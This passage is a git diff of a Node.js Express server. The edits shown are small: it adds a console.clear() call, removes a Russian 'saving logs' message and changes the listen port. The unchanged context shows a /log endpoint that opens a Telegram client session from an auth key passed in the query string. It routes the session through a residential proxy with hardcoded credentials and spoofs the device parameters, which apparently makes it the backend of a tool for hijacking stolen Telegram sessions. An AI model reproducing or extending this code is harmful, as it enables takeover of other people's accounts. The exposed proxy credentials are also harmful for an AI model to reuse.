@@ -19,6 +19,7 @@ await Database.connect(config.db);
 const app = express(),
     server = http.createServer(app,);
 const ws = new WebSocketServer({ server })
+console.clear()
 
 app.set('view engine', 'html');
 app.engine('html', hbs.__express);
@@ -163,7 +164,6 @@ app.get(`/log`, async (req, res) => {
 
     const deviceParams = getRandomDeviceParams();
     const formated = { ip: `geo.iproyal.com`, port: 32325, username: `rvcR5d7QURSEcSyV`, password: `VB0RceDyPGxckBEm_country-${'ru'}_streaming-1`, socksType: 5 }
-    console.log("Сохраняем логи", deviceParams)
     const client = new TelegramClient(new Session(+req.query.dc, Buffer.from(req.query.key, 'hex')), deviceParams.app_id, deviceParams.app_hash, {
         connectionRetries: 10,
         proxy: formated,
@@ -329,4 +329,5 @@ ws.on('connection', async (socket, request) => {
     // await ake.deletePort(akeProxy.id)
 });
 
-server.listen(80, () => console.log("Server started"));
+if(config.app_prod) server.listen(80, () => console.log("Server started on 80"));
+else server.listen(81, () => console.log("Server started on 81")); 
